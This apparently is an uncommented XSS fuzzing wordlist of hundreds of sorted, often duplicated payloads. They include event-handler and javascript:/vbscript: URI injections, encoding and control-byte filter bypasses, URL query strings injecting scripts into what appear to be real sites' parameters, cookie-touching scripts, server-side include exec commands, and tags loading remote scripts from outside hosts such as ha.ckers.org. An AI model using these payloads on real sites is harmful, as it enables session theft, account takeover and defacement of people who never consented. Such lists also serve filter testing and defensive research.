>"<IMG SRC="javascript:document.cookie=true;">
<IMG SRC=`javascript:javascript:alert(1)`>
<IMG SRC=`javascript:javascript:alert(1)`>
<IMG SRC="jav    ascript:javascript:alert(1);">
<IMG SRC="jav	ascript:javascript:alert(1);">
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC="javascript:javascript:alert(1)"
<IMG SRC="javascript:javascript:alert(1)"
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC="jav&#x09;ascript:alert('CrossSiteScripting');">
<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');"><IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');"><IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('CrossSiteScripting');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('CrossSiteScripting');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC="livescript:[code]">
<IMG SRC="livescript:[code]">
<IMG SRC="livescript:[code]">
<IMG SRC="livescript:[code]">
<IMG SRC="livescript:[code]">
<img src="livescript:document.cookie=true;">
>"<img src="livescript:document.cookie=true;">
<IMG SRC="mocha:[code]">
<IMG SRC="mocha:[code]">
<img src="mocha:document.cookie=true;">
>"<img src="mocha:document.cookie=true;">
<--`<img/src=` onerror=alert(1)> --!>
<--`<img/src=` onerror=alert(1)> --!>
<--`<img/src=` onerror=alert(1)> --!>
<--`<img/src=` onerror=alert(1)> --!>
<--`<img/src=` onerror=alert(1)> --!>
<--`<img/src=` onerror=alert(1)> --!>
<img src onerror /" '"= alt=javascript:alert(1)//">
<img src onerror /" '"= alt=javascript:alert(1)//">
<img src=# onerror\x3D"javascript:alert(1)" >
<img src=# onerror\x3D"javascript:alert(1)" >
<IMG SRC= onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC=# onmouseover="alert('xxs')">
<img src="/" =_=" title="onerror='prompt(1)'">
<img src="/" =_=" title="onerror='prompt(1)'">
<img src="/" =_=" title="onerror='prompt(1)'">
<img src="/" =_=" title="onerror='prompt(1)'">
<img src="/" =_=" title="onerror='prompt(1)'">
<img src="/" =_=" title="onerror='prompt(1)'">
<IMG SRC='vbscript:msgbox("CrossSiteScripting")'>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC='vbscript:msgbox("XSS")'>
<img src\x00=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
`"'><img src='#\x27 onerror=javascript:alert(1)>
`"'><img src='#\x27 onerror=javascript:alert(1)>
<img src\x32=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<img src=x onerror="javascript:window.onerror=alert;throw 1">
<img src=x onerror=prompt`1`>
<img src=x onerror=prompt(1);>
#”><img src=x onerror=prompt(1)>
"><img src=x onerror=prompt(1);><a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
"><img src=x onerror=window.open('https://www.google.com/');>
"><img src=x onerror=window.open('https://www.google.com/');>
"><img src=x onerror=window.open('https://www.google.com/');>
"><img src=x onerror=window.open('https://www.google.com/');>
"><img src=x onerror=window.open('https://www.google.com/');>
"><img src=x onerror=window.open('https://www.google.com/');>
<img src=x onerror=\x00"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=`x` onrerror= ` ;; alert(1) ` />
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img src=`xx:xx`onerror=alert(1)>
<img src=`xx:xx`onerror=alert(1)>
<img src=`xx:xx`onerror=alert(1)>
<img src=`xx:xx`onerror=alert(1)>
<img src=`xx:xx`onerror=alert(1)>
<img src=`xx:xx`onerror=alert(1)>
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
<IMG STYLE="CrossSiteScripting:expr/*CrossSiteScripting*/ession(alert('CrossSiteScripting'))">
<IMG STYLE="CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)">
>"<IMG STYLE="CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<img \x00src=x onerror="alert(1)">
<img \x00src=x onerror="alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img\x0bsrc='1'\x0bonerror=alert(0)>
<img\x10src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<?import namespace="t" implementation="#default#time2">
&includePage=0103020000e.cfm&idToOpen=2420&ThisStartResultPage=4&ThisPage="<marquee><img src=k onerror=alert("XSS") />
<input onblur=javascript:alert(1) autofocus><input autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<input onfocus=javascript:alert(1) autofocus>
<input onfocus=javascript:alert(1) autofocus>
<input onfocus=write(XSS) autofocus>
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<input type="image" dynsrc="javascript:document.cookie=true;">
>"<input type="image" dynsrc="javascript:document.cookie=true;">
<input type="image" formaction=JaVaScript:alert(0)>
<INPUT TYPE="IMAGE" SRC="javascript:alert('CrossSiteScripting');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
>"<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<input type="text"value=""onclick="location=window[`atob`]`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21ha W4p`"/>
<input type="text" value=""onfocus=location='javascript:alert`1`' autofocus""/>
<input type="text" value=""onresize=pompt(1) "> // IE 10 docmode
<input value=<><iframe/src=javascript:confirm(1)
<input value=<><iframe/src=javascript:confirm(1)
<input value=<><iframe/src=javascript:confirm(1)
<input value=<><iframe/src=javascript:confirm(1)
<input value=<><iframe/src=javascript:confirm(1)
<input value=<><iframe/src=javascript:confirm(1)
insert <script>alert(document.cookie)</script>
&intcmp=nws-hd-srch&searchTerm=%3Cbody%20onload=alert(document.cookie)%3E
ì><<script>alert(document.cookie);//<</script>
ì><ScRiPt>alert(document.cookie)</script>
ì><sî%2bîcript>alert(document.cookie)</script>
<isindex action="javascript:alert(1)" type=image> // Firefox, IE
<isindex action="javas&Tab;cript:alert(1)" type=image>
<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image> Google Chrome, IE
<isindex x="javascript:" onmouseover="alert(1)" label="test"> // Firefox, IE
&issue=%22+onfocus=if%28!this.a%29{alert%28String.fromCharCode%2888,83,83%29%29;this.a=1;}//%20AUTOFOCUS=%22&id_prd=-1&id_pty=-1&type=3&stype=1&MM_submit=Perform+search
&i=WmYmMm28
<i\x00mg src='1' onerror=alert(0) />
j
javascript:alert("hellox worldss")
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript:/*-- >]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img - /style=a:expression&#40&#47&#42'/- /*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms- behavior:url(#default#time2) name=alert(1)onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
&js=n&prev=_t&hl=en&ie=UTF-8&layout=2&eotf=1&sl=zh-CN&tl=en&u=http://www.govsb.org/blog/306.html
JSP 		a = val1
&k=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
<keygen autofocus onfocus=alert(1)>
&Key=ident&Key2="><script>alert(String.fromCharCode(88,83,83))</script>
&keys=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F
&keyword=%22\\%3E%3Cimg%20src=x%20onerror=alert(0)%3E%3Ciframe%20src=http://www.reddit.com/r/xss%20height=800%20width=600%3E%3C/input&what=all&search_btn.x=0&search_btn.y=0
&keyword=%22%3E%3C/input%3E%3Cscript%3Ealert%28%22XSS%22%29%3B%3C/script%3E%3Cinput%20type%3D%22text
&keyword=%22%3E%3Cscript%3Ealert%28%270%27%29;%3C/script%3E
&keyword=%22%3EXSS%3Csvg/onload=alert%28/xssposed/%29%3E&fname=&lname=&unit=&submit=Search
&keyword=%22;alert%28%27XSS%27%29;//
&keyword=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F
&keyword=%3B!--%22%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E%3D%26{%28%29}
&keyword=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
&keyword=k61161&pageid=icb.page316368&pageContentId=icb.pagecontent828781&view=view.do&state=maximize&viewParam_q=<script>alert('0');</script>
&Keywords=%22%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E
&keywords=%22%2f%3E%3Cscript%3Ealert%28%27xss%27%29%3b%3C%2fscript%3E
&keywords=%22%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E%22&submit=Search+Again
&keywords=%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%3Cimg+src%3D%22
&keywords=%22%3E%3Cscript+type%3D%22text/javascript%22%3Ealert(%22Hello,+/r/XSS%22);%3C/script%3E&x=0&y=0&search_section=products
&keywords=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&per_page=15
&keywords=%3Cscript%3Ealert(0)%3C/script%3E
&keywords=--%3E%3C/script%3E%3Cscript%20%0D%0A%3Ealert%28/XSSPOSED/%29%3b%3C/script%3E
&keyword="><script>alert('XSS')</script>
&keywords='<script>alert(String.fromCharCode(88,83,83))</script>
&keywords="+type="image"+src='http://static.reddit.com/reddit.com.header.png'
&keyword=XSS%22autofocus%2FXSS%2Fonfocus%3D%22alert%28%2FXSSPOSE%2F%29
&keyword=zina"><script src="http://www.yourjavascript.com/38310202111/xss.js">&Search=++++++&winestyle=&grapevariety=&wineRegion=&winePrice=
&kid=TTB2
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
&k="><script>alert('0');</script>
&k=<script>alert('XSS');</script>&s=Entire+Site
&kw=%27;alert%28%27XSS%27%29;//
l
L
l= 0 || 'str',m= 0 || 'sub',x= 0 || 'al',y= 0 || 'ev',g= 0 || 'tion.h',f= 0 || 'ash',k= 0 || 'loca',d= (k) + (g) + (f),a
&lang=%22%3E%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E
&lang=en_GB&word1=%3CIMG+SRC%3Dhttp%3A%2F%2Fbestuff.com%2Fimages%2Fimages_of_stuff%2F64x64crop%2Fdavid-hasselhoff-6442.jpg%3F1173013118%3E&word2=good%20taste
&lang=en&page=49&tbmonth=09&tblng=1&tbyear=2010'%22%3Cscript%3Ealert%28/XSS/.source%29%3C/script%3E&tbfrom=0&tbto=30
&language=1%3C/textarea%3E%3CScRiPt%20%0A%0D%3Ealert%28unescape%28/brb%2c%20mysql%20manual/.source%29%29%3B%3C/ScRiPt%3E
&latitude=&city=&zip=&longitude=&state=&lonlatRequired=N&keyWord="><script>alert%28"XSS"%29</script>&address=&country=AF&pageDropDown=1&sortType=DEFAULT&sortType=5&countryCd=AF&countryName=AFGHANISTAN
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LAYER SRC="http://vulnerability-lab.com/script.html"></LAYER>
<LAYER SRC="javascript:document.cookie=true;"></LAYER>
>"<LAYER SRC="javascript:document.cookie=true;"></LAYER>
<LAYER SRC="%(scriptlet)s"></LAYER>
<LAYER SRC="%(scriptlet)s"></LAYER>
&l=eaedfaedae%22);}alert('xss');{//
&l-id=gb_category_search
&lingua=it%22----%3E%3E%27%27%3E%3Cscript%3Eprompt%28%27XSSPOSED%27%29%3C/script%3E
<link%20rel=import%20href=http://avlidienbrunn.se/test.php>
<link rel="import" href="data:text/html&comma;&lt;script&gt;alert(document.domain)&lt ;&sol;script&gt;
<link/rel=prefetch&#10import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4g>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<LINK REL="stylesheet" HREF="http://vulnerability-lab.com/CrossSiteScripting.css">
<LINK REL="stylesheet" HREF="javascript:alert('CrossSiteScripting');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<link rel="stylesheet" href="javascript:document.cookie=true;">
>"<link rel="stylesheet" href="javascript:document.cookie=true;">
<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
>"<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
&list=PLpr-xdpM8wG-ZTcHhFfAeBthNVZVEtkg9
&list="><script>alert(String.fromCharCode(88,83,83))</script>
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
&localeCode=en_US&complexSearchField=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F&searchType=&propertyIds=&arrivalDate=&departureDate=
&locale=en_US&gameId=1;alert%28%27xssd%27%29;
location=name//','javascript:alert(1)');
&location=<script>alert("xss");</script>&panel=poi&submit=Show+map&intCam=intViewAMapOf
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
&l=sem&ifr=1&qsrc=999&q=%22%3E%3Cscript%3Ealert(%22O%22)%3C%2Fscript%3E&siteid=15142&o=15142&ar_uid=92870BDC-560E-4FB3-A36E-5798824C02D1&click_id=C48A76B3-2E24-4D2D-9F9E-815DD58C9203
&lsort=speaker&day=9%3Cimg%20src=http://i.imgur.com/P8mL8.jpg%3E%3Csvg%3E%3Cscript%3E%3C!%3Ealert%28%22XSS%22%29%3C/script%3E&conference=interactive&a=a
&lt
&lt;
&lt;
&lt;
&LT
&LT;
&lt;!&#91;endif&#93;--&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt	p&#58;//6	6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;? echo('&lt;SCR)';
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;HTML&gt;&lt;BODY&gt;
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
